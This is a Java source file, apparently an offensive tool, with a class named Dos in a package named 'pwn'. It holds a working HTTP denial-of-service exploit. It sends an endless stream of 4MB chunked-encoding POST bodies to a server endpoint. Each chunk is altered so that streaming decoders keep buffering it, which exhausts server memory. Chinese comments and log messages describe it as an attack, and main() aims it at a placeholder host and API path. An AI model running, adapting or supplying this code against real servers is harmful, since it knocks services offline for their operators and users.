package nano.http.bukkit.pwn;

import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class Dos {
    private static void testSingleChunkedConnection(String HOST, int PORT, String TARGET_PATH, String COOKIE) {
        try (Socket socket = new Socket(HOST, PORT)) {
            socket.setSoTimeout(5000);
            OutputStream out = socket.getOutputStream();
            String request = "POST " + TARGET_PATH + " HTTP/1.1\r\n" +
                    "Host: " + HOST + ":" + PORT + "\r\n" +
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n" +
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
                    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\n" +
                    "Accept-Encoding: gzip, deflate\r\n" +
                    "Content-Type: application/x-www-form-urlencoded\r\n" +
                    "Cookie: " + COOKIE + "\r\n" +
                    "Transfer-Encoding: chunked\r\n" +
                    "Connection: keep-alive\r\n" +
                    "\r\n";
            out.write(request.getBytes(StandardCharsets.UTF_8));
            out.flush();
            int chunkCount = 1;

            StringBuilder trash = new StringBuilder("X");
            // 4MB
            for (int i = 0; i < 22; i++) {
                trash.append(trash);
            }

            String built = trash.toString();
            String chunkSizeHex = Integer.toHexString(built.length());
            String chunk = chunkSizeHex + "\r\n" +
                    built + "\r\n";
            byte[] cB = chunk.getBytes(StandardCharsets.UTF_8);

            while (true) {
                chunkCount++;
                System.out.println("发送chunk #" + chunkCount + ", 大小: " + cB.length);
                // 构造cB左值避免流式解码器不吃攻击
                int ptr = 100;
                int tmp = chunkCount;
                while (true) {
                    cB[ptr] = (byte) ('0' + (tmp % 10));
                    tmp /= 10;
                    if (tmp == 0) {
                        break;
                    }
                    ptr++;
                }
                cB[ptr + 10] = '=';
                cB[ptr + 11] = 'Y';
                cB[ptr + 12] = '&';
                out.write(cB);
                out.flush();
            }

        } catch (Exception e) {
            System.out.println("连接异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        testSingleChunkedConnection("123.456", 3033, "/api/dynamic-link/create", "idfk");
    }
}
